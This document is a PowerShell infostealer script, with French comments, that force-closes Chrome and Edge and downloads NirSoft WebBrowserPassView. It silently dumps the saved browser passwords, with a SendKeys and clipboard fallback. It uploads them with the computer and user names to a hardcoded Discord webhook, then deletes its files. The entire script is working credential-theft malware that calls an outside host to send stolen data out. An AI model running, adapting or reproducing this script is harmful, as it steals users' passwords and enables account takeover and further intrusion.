$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

function Send-Discord { param([string]$m) try { irm $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType 'application/json' | Out-Null } catch {} }

Send-Discord "🟢 START - $env:COMPUTERNAME | $env:USERNAME"

# Tuer SEULEMENT Chrome et Edge (PAS BRAVE)
Get-Process chrome,msedge -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 3

Set-Location $env:TEMP
Remove-Item wbpv*,passwords.txt -Recurse -Force -EA 0

Send-Discord "📥 Downloading WebBrowserPassView..."

try {
    [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
    
    # Télécharger WebBrowserPassView (NirSoft)
    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip" -OutFile "wbpv.zip" -UseBasicParsing
    
    if (!(Test-Path "wbpv.zip")) {
        Send-Discord "❌ Download failed"
        exit
    }
    
    Send-Discord "📦 Extracting..."
    Expand-Archive "wbpv.zip" -DestinationPath "wbpv" -Force
    
    $exe = Get-ChildItem -Path "wbpv" -Filter "WebBrowserPassView.exe" -Recurse | Select -First 1
    
    if (!$exe) {
        Send-Discord "❌ EXE not found"
        exit
    }
    
    Send-Discord "🔓 Extracting passwords..."
    
    # Méthode 1 : Export direct en TXT (comme ta méthode VBScript)
    $outputFile = "$env:TEMP\passwords.txt"
    Start-Process $exe.FullName -ArgumentList "/stext `"$outputFile`"" -Wait -WindowStyle Hidden
    
    Start-Sleep 3
    
    if (Test-Path $outputFile) {
        $content = Get-Content $outputFile -Raw -EA 0
        
        if ($content -and $content.Length -gt 100) {
            $count = ([regex]::Matches($content, "Password:")).Count
            $size = [math]::Round((Get-Item $outputFile).Length / 1KB, 2)
            
            Send-Discord "📤 Found $count passwords - Uploading $size KB..."
            
            curl.exe -F "file=@$outputFile" -F "content=🔑 **$count PASSWORDS EXTRACTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Date:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" $wh
            
            Send-Discord "✅ SUCCESS"
        } else {
            Send-Discord "⚠️ File created but empty or too small"
        }
    } else {
        Send-Discord "❌ Output file not created - trying GUI method..."
        
        # Méthode 2 : GUI + SendKeys (comme ton VBScript)
        $proc = Start-Process $exe.FullName -PassThru
        Start-Sleep 2
        
        # Charger l'assembly pour SendKeys
        Add-Type -AssemblyName System.Windows.Forms
        
        # Sélectionner tout et copier
        [System.Windows.Forms.SendKeys]::SendWait("^a")
        Start-Sleep 200
        [System.Windows.Forms.SendKeys]::SendWait("^c")
        Start-Sleep 500
        
        # Récupérer le clipboard
        $clipboard = Get-Clipboard -Raw
        
        # Fermer le programme
        $proc | Stop-Process -Force -EA 0
        
        if ($clipboard) {
            $outputFile | Out-Null
            $clipboard | Out-File $outputFile -Encoding UTF8
            
            $count = ([regex]::Matches($clipboard, "Password:")).Count
            Send-Discord "📤 GUI method - Found $count passwords..."
            
            curl.exe -F "file=@$outputFile" -F "content=🔑 **$count PASSWORDS (GUI)**`n$env:COMPUTERNAME" $wh
            Send-Discord "✅ SUCCESS"
        } else {
            Send-Discord "❌ Clipboard empty"
        }
    }
    
} catch {
    Send-Discord "❌ Error: $($_.Exception.Message)"
}

Remove-Item wbpv*,passwords.txt -Recurse -Force -EA 0
Send-Discord "🧹 DONE"
